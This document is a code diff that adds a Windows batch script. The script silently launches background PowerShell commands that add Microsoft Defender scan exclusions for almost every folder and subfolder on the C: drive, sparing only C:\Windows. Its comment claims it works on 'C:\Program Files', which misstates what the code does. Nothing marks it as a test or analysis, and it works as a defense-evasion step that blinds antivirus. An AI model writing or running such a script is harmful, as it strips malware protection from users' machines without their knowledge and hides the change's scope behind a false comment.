@@ -1,0 +1,21 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Get a list of directories within "C:\Program Files"
+for /d %%D in ("C:\"*) do (
+    echo Processing directory: %%~nxD
+
+    :: Check if the current directory is not "C:\Windows"
+    if /i "%%~fD" neq "C:\Windows" (
+        :: Execute the command for the current directory in a background PowerShell process
+        set "chosenItem=%%~fD"
+        start /b powershell.exe -c "Add-MpPreference -ExclusionPath '!chosenItem!'"
+
+        :: Loop through subdirectories and execute the command in a background PowerShell process
+        for /d %%S in ("%%D\*") do (
+            set "chosenItem=%%~fS"
+            start /b powershell.exe -c "Add-MpPreference -ExclusionPath '!chosenItem!'"
+        )
+    )
+)
+goto :eof
